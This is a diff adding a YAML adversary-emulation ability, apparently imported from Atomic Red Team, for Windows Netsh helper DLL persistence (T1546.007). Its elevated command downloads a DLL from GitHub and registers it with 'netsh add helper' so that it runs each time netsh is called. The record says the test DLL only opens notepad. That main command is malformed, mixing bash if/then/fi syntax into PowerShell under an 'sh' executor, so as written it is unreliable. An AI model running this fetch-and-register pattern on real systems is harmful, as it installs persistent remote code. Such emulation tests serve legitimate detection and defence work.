@@ -1,0 +1,61 @@
+- id: 3244697d-5a3a-4dfc-941c-550f69f91a4d
+  name: Netsh Helper DLL Registration
+  description: 'You can register a "helper dll" with Netsh as a persistance mechanism.
+    The code in the dll is executed every time netsh.exe is called.
+
+    The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe
+    is run.
+
+
+    [Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)
+
+    [Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.007
+    name: 'Event Triggered Execution: Netsh Helper DLL'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll")
+          { exit 0} else { exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll"
+          -OutFile "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"; fi; netsh.exe
+          add helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"; taskkill
+          /im notepad.exe /t /f > NUL 2>&1'
+        cleanup: netsh.exe delete helper "#{helper_file}"
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1546.007
+  - privilege-escalation
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      helper_file:
+        description: Path to DLL
+        type: path
+        default: PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll
+    dependencies:
+    - description: 'Helper DLL must exist on disk at specified location (#{helper_file})
+
+        '
+      prereq_command: 'if (Test-Path "#{helper_file}") { exit 0} else { exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{helper_file}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll"
+        -OutFile "#{helper_file}"
+
+        '
+    technique_created: '2020-01-24T14:26:51.207Z'
+    atomic_guid: 3244697d-5a3a-4dfc-941c-550f69f91a4d
+    import_timestamp: '2025-06-24T11:15:02.842631Z'
